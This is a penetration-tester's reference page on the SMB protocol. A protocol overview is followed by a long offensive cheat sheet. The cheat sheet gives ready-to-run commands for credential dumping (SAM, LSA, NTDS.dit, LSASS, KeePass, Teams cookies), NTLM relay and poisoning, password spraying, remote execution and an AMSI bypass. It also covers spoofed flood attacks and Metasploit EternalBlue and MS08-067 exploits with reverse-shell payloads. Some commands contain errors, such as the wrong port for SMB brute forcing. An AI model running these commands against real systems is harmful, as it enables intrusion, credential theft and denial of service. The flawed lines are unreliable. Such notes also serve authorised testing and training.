# Index
- [[Ports, Protocols, and Services]]
	- [[P137 NetBIOS Name Service]]
	- [[P138 NetBIOS Datagram Service]]
	- [[P139 NetBIOS Session Service]]

# Server Message Block (SMB)

- **Port Number:** 445 (primary), 137-139 (NetBIOS over TCP/IP)
- **Protocol:** TCP
- **Service Name:** Server Message Block (SMB)
- **Defined in:** Originally defined by IBM and later by Microsoft in CIFS and the SMB protocol family.

The Server Message Block (SMB) protocol is a network file-sharing protocol that allows applications and users to access files, printers, and other resources on a network. SMB operates primarily over TCP port 445, although earlier implementations used NetBIOS over TCP/IP (ports 137-139). SMB has evolved over the years, with the most recent versions adding support for enhanced security and performance features.

## Overview of Features

- **File and Printer Sharing:** SMB allows shared access to files and printers on a network, enabling collaborative work environments.
  
- **Named Pipes and Mail Slots:** SMB provides mechanisms for inter-process communication via named pipes and mail slots, allowing applications to communicate over a network.

- **Authentication and Access Control:** SMB supports user authentication and access control mechanisms, allowing administrators to define who can access specific resources.

- **File Locking:** To prevent conflicts, SMB includes file locking mechanisms that ensure that only one user or process can modify a file at a time.

- **Opportunistic Locking (Oplocks):** SMB supports oplocks, which allow a client to cache file data locally to reduce network traffic and improve performance.

- **SMB Versions:** 
  - **SMBv1:** The original version, prone to security vulnerabilities, including the notorious EternalBlue exploit.
  - **SMBv2:** Introduced with Windows Vista, it improved performance, reduced command complexity, and included better security features.
  - **SMBv3:** Further enhancements, including encryption of data in transit and improved performance for large file transfers.

- **DFS (Distributed File System):** SMB integrates with DFS, allowing a single namespace to span multiple file servers, simplifying access to network resources.

- **Support for Modern File Systems:** SMB is compatible with NTFS, ReFS, and other modern file systems, supporting features like file permissions, ACLs, and quotas.

## Typical Use Cases

- **File Sharing:** SMB is widely used for sharing files between computers on a local network, especially in corporate environments.

- **Printer Sharing:** SMB allows networked printers to be shared across multiple users, centralizing printing resources.

- **Network Drive Mapping:** Users can map network drives using SMB, making remote directories appear as local drives.

- **Enterprise Environments:** SMB is a cornerstone of Windows-based enterprise networks, supporting file and print services.

- **Home Networks:** In home networks, SMB is often used to share files between devices such as computers, NAS devices, and media centers.

## How SMB Protocol Works

1. **Session Establishment:**
   - **Step 1:** The client sends a TCP connection request (SYN) to the server on port 445.
   - **Step 2:** The server responds with a SYN-ACK, and the client replies with an ACK, establishing a TCP connection.

2. **Negotiation:**
   - **Step 3:** The client sends an SMB negotiation request to determine the protocol dialect to use (e.g., SMBv1, SMBv2, or SMBv3).
   - **Step 4:** The server responds with an SMB negotiation response, indicating the supported dialects.

3. **Authentication:**
   - **Step 5:** The client sends an authentication request using a specific authentication protocol (e.g., NTLM, Kerberos).
   - **Step 6:** The server validates the credentials and responds with an authentication success or failure message.

4. **Session Setup:**
   - **Step 7:** The client establishes a session with the server, and both agree on security settings, including encryption if SMBv3 is used.

5. **Tree Connect:**
   - **Step 8:** The client requests access to a specific share on the server (e.g., a shared folder or printer).
   - **Step 9:** The server responds with a tree ID (TID) that the client will use in subsequent requests to refer to the share.

6. **File Operations:**
   - **Step 10:** The client sends SMB commands to open, read, write, or delete files on the server.
   - **Step 11:** The server processes the requests and sends back the appropriate responses (e.g., file content, success, or error messages).

7. **Session Termination:**
   - **Step 12:** The client sends a logoff request to end the session, and the server acknowledges this request.
   - **Step 13:** The TCP connection is closed, completing the SMB interaction.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` requests access to a shared folder on `<target_ip>`:445.
- **Server:** `<target_ip>` negotiates the SMB dialect, authenticates the client, and grants access to the requested resources.
- **Client:** `<attack_ip>` reads a file, modifies it, and logs off, terminating the session.

# Additional Information

## SMB Versions
- **SMBv1:**
  - **Description:** The original version of SMB, known for its simplicity but also for security weaknesses. It is susceptible to attacks such as EternalBlue.
  - **Recommendation:** Deprecated and should be disabled in favor of more secure versions.

- **SMBv2:**
  - **Description:** Introduced with Windows Vista and Windows Server 2008, SMBv2 improved performance and security, reducing command overhead and providing better scalability.
  - **Features:** Improved performance with fewer commands, support for large MTUs, and more secure authentication methods.

- **SMBv3:**
  - **Description:** Introduced with Windows 8 and Windows Server 2012, SMBv3 includes features such as end-to-end encryption and better performance over WAN links.
  - **Features:** Encryption, improved resiliency with continuous availability, and SMB Multichannel for using multiple network connections.

## Security Considerations
- **Vulnerabilities:** SMBv1 is known for critical vulnerabilities, including the EternalBlue exploit, which was used in the WannaCry ransomware attack.
  
- **Encryption:** SMBv3 introduced encryption for data in transit, providing confidentiality against eavesdropping attacks.

- **Authentication:** While SMB supports NTLM, it is recommended to use Kerberos for stronger authentication, especially in domain environments.

- **Firewall Considerations:** SMB operates over TCP port 445, which should be restricted to internal networks to prevent exposure to the internet.

## Alternatives
- **NFS (Network File System):** An alternative file-sharing protocol commonly used in Unix/Linux environments.
  
- **FTP (File Transfer Protocol):** A simpler, less secure file-sharing protocol often used for transferring files between systems.

## Advanced Usage
- **SMB Multichannel:** A feature of SMBv3 that allows multiple network connections to be used simultaneously for higher throughput and fault tolerance.
  
- **SMB Direct:** Uses RDMA (Remote Direct Memory Access) to provide high-throughput, low-latency networking for SMB traffic.

## Modes of Operation
- **Standard File Sharing:** The most common use case, allowing shared access to files and directories over a network.
  
- **Clustered File Sharing:** In enterprise environments, SMB can be used with clustered file systems for high availability and scalability.

## Configuration Files

1. **Windows Group Policy:**
  - **Location:** `gpedit.msc`
  - **Settings:** 
    - **Enable/Disable SMBv1:**
      - `Computer Configuration -> Administrative Templates -> Network -> Lanman Workstation -> Enable insecure guest logons`
    - **Require SMBv2/SMBv3:**
      - `Computer Configuration -> Administrative Templates -> Network -> Lanman Workstation -> Minimum session security for NTLM SSP based (including secure RPC) clients`
  - **Command Line:**
    ```bash
    Set-SmbServerConfiguration -EnableSMB1Protocol $false
    Set-SmbServerConfiguration -EnableSMB2Protocol $true
    ```

2. **Windows Registry Settings:**
  - **Location:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`
  - **Settings:**
    - **Disable SMBv1:**
      ```bash
      Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Value 0 -Force
      ```

    - **Enable SMBv2/SMBv3:**
      ```bash
      Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB2" -Value 1 -Force
      ```

3. **Linux (Samba Configuration):**
- **File Location:** `/etc/samba/smb.conf`
- **Configuration Example:**
  ```bash
  [global]
     workgroup = WORKGROUP
     server string = Samba Server
     security = user
     passdb backend = tdbsam
     smb ports = 445
     log file = /var/log/samba/log.%m
     max log size = 50
     server role = standalone server
     passdb backend = tdbsam
     map to guest = bad user
     
     [shared]
     path = /srv/samba/shared
     browseable = yes
     read only = no
     guest ok = yes
  ```
- **Key Settings:**
  - `security`: Defines the security mode (e.g., `user`, `share`).
  - `smb ports`: Specifies the port SMB will listen on (typically 445).
  - `log file`: Defines the path for log files.
  - `server role`: Defines the role of the server (e.g., `standalone`, `member server`).

## Potential Misconfigurations

1. **SMBv1 Enabled:**
   - **Risk:** Keeping SMBv1 enabled exposes the network to critical vulnerabilities, including the risk of exploitation by ransomware.
   - **Exploitation:** Attackers can leverage known exploits like EternalBlue to gain unauthorized access to systems.

2. **Guest Access Enabled:**
   - **Risk:** Allowing guest access without proper restrictions can lead to unauthorized access to sensitive data.
   - **Exploitation:** Attackers can exploit guest accounts to access shared files without authentication.

3. **Weak Permissions on Shared Folders:**
   - **Risk:** Misconfigured file permissions can allow unauthorized users to read, modify, or delete critical files.
   - **Exploitation:** Attackers can traverse shares to locate and exfiltrate sensitive information.

4. **No Encryption in SMBv3:**
   - **Risk:** If encryption is not enforced in SMBv3, data in transit can be intercepted and read by attackers.
   - **Exploitation:** Man-in-the-middle attacks can be executed to capture sensitive data.

## Default Credentials

SMB itself does not have default credentials, but misconfigurations in systems or applications can result in the use of weak or default credentials.

- **Username:** `admin`, `guest`
- **Password:** `password`, `admin`

# Interaction and Tools

## Tools

### [[Net]]
- **Connects to a shared resource:**
	```bash
	net use \\<target_ip>\<share_name> /user:<username> <password> 
	```

### [[NBTStat]]
- **Display NetBIOS Name Table of a Remote Machine:** Displays the NetBIOS name table of a remote machine by IP address.
    ```bash
    nbtstat -a <target_ip>
    ```
- **Display NetBIOS Name Table of a Remote Machine:** 
    ```bash
    nbtstat -A <target_ip>
    ```
- **Display NetBIOS Name Table of the Local Machine:** 
    ```bash
    nbtstat -n
    ```
- **Display NetBIOS Name Cache:** 
    ```bash
    nbtstat -c
    ```
- **Display NetBIOS Statistics:** 
    ```bash
    nbtstat -s
    ```
- **Name Registration (Windows):** 
    ```powershell
    nbtstat -RR
    ```
- **Name Release (Windows):** 
    ```powershell
    nbtstat -n
    nbtstat -RR
    ```

### [[NBTScan]]
- **Scan Targets:** Scans a range of IP addresses and returns the NetBIOS names of each device.
    ```bash
    nbtscan -r <target_ip_range>
    ```

### [[NMBLookup]]
- **Resolve NetBIOS Names:** Resolving NetBIOS names to IP addresses and interacting with WINS servers.
    ```bash
    nmblookup -A <target_ip>
    ```
- **Name Query (Linux/Samba):** Queries the specified NetBIOS name against a remote WINS server (specified by `<target_ip>`).
    ```bash
    nmblookup -U <target_ip> -R '<NetBIOS_name>'
    ```
- **Manual Name Registration (Linux/Samba):** Manually registers a NetBIOS name to a target IP address.
    ```bash
    nmblookup -A <target_ip>
    ```
- **WINS Query (Linux):** Queries all registered NetBIOS names on a WINS server.
    ```bash
    nmblookup -U <target_ip> '*'
    ```

### [[SMBClient]]
- **Connect to SMB with Username and Password:** If you omit the password, it will be prompted.
	```bash
	smbclient --user <username> --password '<password>' //<target_ip>/<share>
	```
- **Connect to a Specific SMB Share with NTLM Hash:** With `--pw-nt-hash`, the password provided is the NT hash.
	```bash
	smbclient --user <username> --pw-nt-hash <hash> --workgroup <domain> //<target_ip>/<share>
	```
- **Connect to a Specific SMB Share with Kerberos:**
	```bash
	smbclient --kerberos //ws01win10.domain.com/C$
	```
- **Connect to a Specific SMB Share with Null Session:**
	```bash
	smbclient --no-pass //<target_ip>/<share>
	```
- **List SMB Shares:**
	```bash
	smbclient -L //<target_ip>/ <password> -U <username>
	smbclient -L //<target_ip>
	smbclient -L -N //<target_ip>
	```
- **Download Files:**
	```bash
	smbclient //<target_ip>/<share> mask "" recurse prompt mget *
	```
- **Upload Files:** 
    ```bash
    smbclient //<target_ip>/<share_name> -U <username> -c "put localfile remotefile"
    ```
- **Broadcast Message Sending:** Sends a broadcast message to all devices on the network.
    ```bash
    echo "Hello network!" | smbclient -M <broadcast_address>
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "udp port 445"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 445
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 445
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 445 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 445
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 445 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:445
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 445 -c 1
    ```

### [[SMBMap]]
- **Target Specification:**
	```bash
	smbmap -H <target_ip> -d <target_domain> -u <username> -p <password> options
	```
- **Accessing Specific Shares:**
	```bash
	-r <share>: Access a specific share on the remote system. 
	-s <share>: Specify a custom SMB share name for shares requiring authentication.
	```
- **Listing Shares:**
	```bash
	-R: Recursively list directories and files in accessible shares.
	```
- **Loading Shares from a File:**
	```bash
	-A <file>: Load a list of shares from a file, one share per line.
	```
- **Quiet Mode:**
	```bash
	-q: Suppress informational messages, displaying only share information.
	```
- **Executing Commands:**
	```bash
	-x <command>: Execute a custom command on a share.
	```
- **Filesystem Interaction:**
	```bash
	--download PATH: Download a file from the remote system, ex.'C$\temp\passwords.txt'
	--upload SRC DST: Upload a file to the remote system ex. '/tmp/payload.exe C$\temp\payload.exe'
	--delete PATH TO FILE: Delete a remote file, ex. 'C$\temp\msf.exe'
	--skip: Skip delete file confirmation prompt
	```

### [[Responder Cheat Sheet]]
- **Run Responder:** Intercept and capture NetBIOS session data for further analysis and exploitation.
    ```bash
    responder -I <interface> -rdwv
    ```

### [[NetExec]]
### [[CrackMapExec]]
- **Zerologon:**
	```bash
	crackmapexec smb <target_ip> -u '' -p '' -M zerologon
	```
- **PetitPotam:**
	```bash
	crackmapexec smb <target_ip> -u '' -p '' -M petitpotam
	```
- **noPAC:** This requires credentials.
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M nopac
	```
- **Map network hosts:**
	```bash
	crackmapexec smb 192.168.1.0/24
	```
- **Enumerate Null Sessions:**
	```bash
	crackmapexec smb <target_ip> -u '' -p ''
	crackmapexec smb <target_ip> --pass-pol
	crackmapexec smb <target_ip> --users
	crackmapexec smb <target_ip> --groups
	```
- **Enumerate anonymous logon:**
	```bash
	crackmapexec smb <target_ip> -u 'a' -p ''
	```
- **Enumerate active sessions:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --sessions
	```
- **Enumerate shares and access:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --shares
	crackmapexec smb <target_ip> -u <username> -p '<password>' --shares --filter-shares READ WRITE
	```
- **Enumerate disks:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --disks
	```
- **Enumerate logged on users:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --loggedon-users
	```
- **Enumerate domain users:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --users
	```
- **Enumerate users by brute forcing RID:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --rid-brute
	```
- **Enumerate domain groups:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --groups
	```
- **Enumerate local groups:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --local-group
	```
- **Enumerate domain password policy:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --pass-pol
	```
- **Enumerate host with SMB signing not required:**
	```bash
	crackmapexec smb <target_ip> --gen-relay-list relaylistOutputFilename.txt
	```
- **Enumerate Antivirus/EDR:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M enum_av
	```
- **Password Spraying Using Manual Username/Password Lists:**
	```bash
	crackmapexec smb <target_ip> -u <username1> <username2> <username3> -p '<password>'
	crackmapexec smb <target_ip> -u <username> -p '<password1>' '<password2>' '<password3'
	```
- **Password Spraying Using External Wordlists:**
	```bash
	crackmapexec smb <target_ip> -u <usernmame_list> -p '<password>'
	crackmapexec smb <target_ip> -u <username> -p <password_list>
	```
- **`--continue-on-success`:** By** default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
	```bash
	crackmapexec smb <target_ip> -u <username_list> -p '<password>' --continue-on-success
	```
- **Checking login == password using wordlist:**
	```bash
	crackmapexec smb <target_ip> -u <username_list> -p <username_list>
	```
- **Checking multiple usernames/passwords using worlist:**
	```bash
	crackmapexec smb <target_ip> -u <username_list> -p <password_list>
	```
- **Checking one login equal one password using wordlist:** No bruteforce possible with this one as 1 user = 1 password. Avoid range or a list of IP when using option `--no-bruteforce`
	```bash
	crackmapexec smb <target_ip> -u <username_list> -p <password_list> --no-bruteforce --continue-on-succes
	```
- **Domain Authentication:** Failed logins result in a `[-]`; Successful logins result in a `[+] Domain\Username:Password`. Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.
	```bash
	SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)
	```
- **Authenticate Using User/Password:** The following checks will attempt authentication to the entire /24 though a single target may also be used.
	```bash
	crackmapexec smb <target_ip>/24 -u <username> -p '<password>'
	```
- **Authenticate Using User/Hash:**
	```bash
	crackmapexec smb <target_ip> -u <username> -H '<LM:NT>'
	crackmapexec smb <target_ip> -u <username> -H '<ntlmhash>'
	
	crackmapexec smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
	crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454'
	```
- **Authenticate Using User/Password/Hashes:** Adding `--local-auth` to any of the authentication commands with attempt to logon locally.
	```bash
	crackmapexec smb <target_ip> -u '' -p '' --local-auth
	crackmapexec smb <target_ip> -u <username> -p '<password>' --local-auth
	crackmapexec smb <target_ip> -u <username> -H '<LM:NT>' --local-auth
	crackmapexec smb <target_ip> -u <username> -H '<ntlmhash>' --local-auth
	
	crackmapexec smb <target_ip> -u <username> -H '13b29964cc2480b4ef454c59562e675c' --local-auth
	crackmapexec smb <target_ip> -u <username> -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
	```
- **Executing commands:** Uses wmiexec, atexec, or smbexec.
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -x 'whoami'
	```
- **Executing PowerShell commands:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -X '$PSVersionTable'
	```
- **Bypass AMSI:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -X '$PSVersionTable' --amsi-bypass /path/payload
	```
- **Spidering Shares:** Default option. Notice the '$' character has to be escaped. (example shown can be used as-is in a kali linux terminal)
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --spider C\$ --pattern txt
	```
- **Spidering Shares Using Spider_plus:** The module `spider_plus` allows you to list and dump all files from all readable shares.
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M spider_plus
	```
- **Dump all files:** Using the option `-o` READ_ONLY=false all files will be copied on the host
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M spider_plus -o READ_ONLY=false
	```
- **Upload a local file to the remote target:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --put-file /tmp/whoami.txt [\\Windows\\Temp\\whoami.txt](file://Windows/Temp/whoami.txt)
	```
- **Download a file from the remote target:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --get-file  [\\Windows\\Temp\\whoami.txt](file://Windows/Temp/whoami.txt) /tmp/whoami.txt
	```
- **Dump SAM:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --sam
	```
- **Dump LSA:** Requires Domain Admin or Local Admin Privileges on target Domain Controller
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --lsa
	```
- **Dump NTDS.dit:** Requires Domain Admin or Local Admin Privileges on target Domain Controller
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds
	crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds --users
	crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds --users --enabled
	crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds vss
	```
- **Dump LSASS Using Lsassy:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M lsassy
	```
- **Dump LSASS Using nanodump:**You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M nanodump
	```
- **Dump WIFI Password:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M wireless
	```
- **Dump KeePass:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M keepass_discover
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
	```
- **Dump DPAPI:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --dpapi
	```
- **Defeating LAPS:** If LAPS is used inside the domain, it can be hard to use CrackMapExec to execute a command on every computer on the domain. Therefore, a new core option has been added `--laps`! If you have compromised an account that can read
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' --laps
	```
- **Print Nightmare Spooler, WebDav Check:** If enabled, run @cube0x0 or Mimikatz from @gentilkiwi to gain SYSTEM on workstations/servers up to date
	```bash
	crackmapexec smb <target_ip> -u <user_name> -p '<password>' -M spooler
	```
- **Steal Microsoft Teams Cookies:** You need at least local admin privilege on the remote target
	```bash
	crackmapexec smb <target_ip> -u <username> -p '<password>' -M teams_localdb
	```

### [[Impacket]]

#### [[Impacket-PSExec]]/[[Impacket-SMBExec]]
- **Connect via PSExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against kerberos instead of NTLM.
	```bash
	impacket-psexec <domain>/<username>:'<password>'@<target_ip>
	impacket-psexec -hashes <LM:NT> <username>@<target_ip>
	```

#### [[Impacket-WMIExec]]
- **Connect via WMIExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against kerberos instead of NTLM.
	```bash
	impacket-wmiexec <domain>/<username>:'<password>'@<target_ip>
	impacket-wmiexec -hashes LM:NT <username>@<target_ip>
	```

#### [[Impacket-DCOMExec]]
- **Connect via DCOMExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against kerberos instead of NTLM.
	```bash
	impacket-dcomexec <domain>/<username>:'<password>'@<target_ip>
	impacket-dcomexec -hashes <LM:NT> <username>@<target_ip>
	```

#### [[Impacket-ATExec]]
- **Connect via ATExec:**
	```bash
	impacket-atexec <domain>/<username>:'<password>'@<target_ip> "command"
	impacket-atexec -hashes <LM:NT> <username>@<target_ip> "whoami"
	```

#### [[Impacket-NTLMRelayX Cheat Sheet]]
- **Start NTLMRelayX:**
	```bash
	sudo impacket-ntlmrelayx -tf targets.txt -smb2support
	```

### [[Enum4Linux]]
- **Enumerate via username/password:** Enumerate information from Windows and Samba systems.
	```bash
	./enum4linux-ng.py -A -u <username> -p <password> -d <domain_controller_ip> <target_ip>
	```

## Other Techniques

### Mount SMB share locally
- **Mount SMB share locally:**
	```bash
	sudo smbmount //<target_ip>/SHARED_FOLDER /local/folder
	```

	```bash
	mount -t cifs -o username=username,password=password //target_ip/shared_folder /mnt/smb
	```

### GUI Connection from Linux
- **GUI Connection from Linux:**
	```bash
	xdg-open smb://<target_ip>/
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 445
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 445
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

<br>

- **Tool:** [[SMBClient]], [[NBTStat]]
    ```bash
    smbclient -L <target_ip>
    ```
- **Description:** Enumerates the shares and services available via NetBIOS Session Service.
- Initial Access

### Null Session 
- **Connect via Null Session:** Exploits unauthenticated connections to gather information from a target system.
	```bash
	smbclient -L //<target_ip>/IPC$ -N
	```

### [[Relay Attacks]]
- **Tool:** [[Responder Cheat Sheet]], [[Impacket-NTLMRelayX Cheat Sheet]]
    ```bash
    impacket-ntlmrelayx -tf targets.txt -smb2support
    sudo responder -I <interface>
        ```

<br>

- **Tool:** [[Responder Cheat Sheet]], [[Impacket-SMBRelayX]]
    ```bash
    impacket-smbrelayx -t <target_ip> -r <relay_ip>
    sudo responder -I <interface>    
    ```

<br>

- **Tool:** [[Responder Cheat Sheet]], [[Metasploit]]
    ```bash
    msfconsole -x "use auxiliary/server/smb_relay; set TARGET <target_ip>; run"
    sudo responder -I <interface>    
    ```
- **Description:** Relay captured credentials to the target service, potentially gaining unauthorized access.

## Persistence

### Creating Persistent Shares
- **Tool:** [[SMBClient]]
    ```bash
    smbclient //<target_ip>/<share_name> -U <username> -c "mkdir /persistent_share"
    ```
- **Description:** Creates a hidden or persistent share that can be accessed later.

### Backdoor through NetBIOS Session
- **Tool:** [[Metasploit]], [[Custom Scripts]]
    ```bash
    net use \\<target_ip>\IPC$ /USER:<user> <password>
    ```
- **Description:** Establish a persistent connection to a shared resource, allowing continuous access.

### Registry Persistence
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v EnableLMHosts /t REG_DWORD /d 1 /f
    ```
- **Description:** Modify registry settings to ensure NetBIOS services start with the system, maintaining a foothold.

## Credential Harvesting

### LLMNR/NBT-NS Poisoning
- **Tool:** [[Responder Cheat Sheet]]
    ```bash
    sudo responder -I <interface>
    ```
- **Description:** Poison LLMNR/NBT-NS requests to intercept and capture NetBIOS credentials.

### Dumping Password Hashes
- **Tool:** [[Impacket-SecretsDump]]
    ```bash
    impacket-secretsdump <username>:<password>@<target_ip>
    ```
- **Description:** Extracts password hashes from the SMB server for offline cracking or pass-the-hash attacks.

## Internal Reconnaissance

### SMB Enumeration
- **Tool:** [[SMBMap]]
```bash
smbmap -H <target_ip>
```
- **Description:** Enumerates accessible SMB shares on internal network systems, identifying potential data sources.

## Lateral Movement, Pivoting, and Tunnelling

### Using SMB for Lateral Movement
- **Tool:** [[Impacket-PSExec]]
    ```bash
    impacket-psexec <domain>/<username>:<password>@<target_ip> cmd
    ```
- **Description:** Executes commands on remote systems using SMB, enabling lateral movement across the network.

## Data Exfiltration

### Exfiltration via Broadcast
- **Tool:** [[Custom Scripts]], [[SMBClient]]
    ```bash
    echo "exfil data" | smbclient -M <broadcast_address>
    ```
- **Description:** Use broadcast messages to exfiltrate data from a network, making it harder to track the source of the data leak.

### Exfiltrating Data via SMB
- **Tool:** [[SMBClient]]
    ```bash
    smbclient //<target_ip>/<share_name> -U <username> -c "get sensitive_file.txt"
    ```
- **Description:** Copy sensitive files from the SMB server to the attacker’s machine.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra smb://<target_ip> -s 443 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra smb://<target_ip> -s 443 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

## Exploits 

### MS17-010 (EternalBlue)
- **Tool:** [[Metasploit]], [[Custom Scripts]]
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in Microsoft's implementation of the SMB protocol that could allow remote code execution. This exploit was used in the WannaCry ransomware attack.

### MS08-067 (Conficker Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in the Server service's handling of RPC requests, allowing for remote code execution.

### MS03-026 (Blaster Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms03_026_dcom
    set RHOST <target_ip>
    run
    ```
- **Description:** A critical vulnerability in the RPC interface that allowed remote code execution. Exploits a heap overflow in the RPCSS service to execute arbitrary code with SYSTEM privileges.

### PrintNightmare (CVE-2021-34527)
- **Tool:** [[Metasploit]]
	```bash
	use exploit/windows/smb/printnightmare
	set RHOSTS <target_ip>
	exploit
	```
- **Description:** Exploits the Windows Print Spooler service via SMB for remote code execution.

### SMBGhost (CVE-2020-0796)
- **Tool:** [[Metasploit]] 
	```bash
	use exploit/windows/smb/smb_ghost
	set RHOSTS <target_ip>
	exploit
	```
- **Description:** A vulnerability in SMBv3 that allows remote code execution. A buffer overflow vulnerability in SMBv3 that allows for remote code execution.

### IPC$ Share Exploit
- **Description:** 
	The IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.
	
	The IPC$ share is created by the Windows Server service. This special share exists to allow for subsequent named pipe connections to the server. The server's named pipes are created by built-in operating system components and by any applications or services that are installed on the system. When the named pipe is being created, the process specifies the security associated with the pipe. Then it makes sure that access is only granted to the specified users or groups.
	
	Configure anonymous access by using network access policy settings
	
	The IPC$ share can't be managed or restricted in the following versions of Windows:
	
	- Windows Server 2003
	- Windows Server 2008
	- Windows Server 2008 R2
	
	However, an administrator has controls over any named pipes that were enabled. They can be accessed anonymously by using the `Network access: Named Pipes that can be accessed anonymously` security policy setting. If the policy setting is configured to have no entries, such as a Null value, no named pipes can be accessed anonymously. And you must ensure that no applications or services in the environment rely on anonymous access to any named pipes on the server.
	
	Windows Server 2003 no longer prevents anonymous access to IPC$ share. The following security policy setting defines whether the Everyone group is added to an anonymous session:
	
	`Network access: Let Everyone permissions apply to anonymous users`
	
	If this setting is disabled, the only resources that can be accessed by an anonymous user are those resources granted to the Anonymous Logon group.
